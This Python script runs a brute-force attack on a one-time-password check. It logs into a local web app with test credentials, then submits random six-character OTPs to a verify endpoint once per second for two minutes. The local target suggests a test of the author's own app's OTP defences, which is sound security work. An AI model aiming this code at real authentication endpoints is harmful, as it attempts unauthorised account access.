import requests
import string
import random
import time
from datetime import datetime, timedelta
import dotenv
dotenv.load_dotenv()
from testing_credentials import EMAIL, PASSWORD, RESOURCE

# Configuration
BASE_URL = "http://127.0.0.1:5000"
LOGIN_URL = f"{BASE_URL}/"
VERIFY_OTP_URL = f"{BASE_URL}/verify_otp_and_grant_access"


# Function to log in and get the session
def login():
    session = requests.Session()
    response = session.post(LOGIN_URL, data={"Email": EMAIL, "Password": PASSWORD})
    if response.status_code == 200 and "OTP" in response.text:
        print("Login successful. OTP sent to email.")
        return session
    else:
        print("Login failed.")
        return None

# Function to generate OTPs based on the character set
def generate_otp_characters():
    characters = string.ascii_letters + string.digits + string.punctuation  # Letters, digits, and symbols
    return characters

def brute_force_otp(session, time_limit=2*60):
    print("Starting OTP brute-force attack...")

    # Start timer
    start_time = datetime.now()

    characters = generate_otp_characters()
    otp_length = 6  # Length of the OTP

    # Iterate over all possible OTP combinations until time limit is reached
    while (datetime.now() - start_time).total_seconds() < time_limit:
        otp_str = ''.join(random.choices(characters, k=otp_length))  # Generate random OTP of length 8
        response = session.post(
            VERIFY_OTP_URL,
            data={"otp": otp_str, "resource": RESOURCE},
        )
        if "access granted" in response.text.lower():  # Check for success message
            print(f"OTP found: {otp_str}")
            print(f"Response: {response.text}")
            return
        else:
            print(f"Trying OTP: {otp_str} - Failed")
        time.sleep(1)  # Add delay (1 second) between requests

    print("Brute-force attack stopped. Time limit reached.")

# Main Execution
if __name__ == "__main__":
    session = login()
    if session:
        brute_force_otp(session)
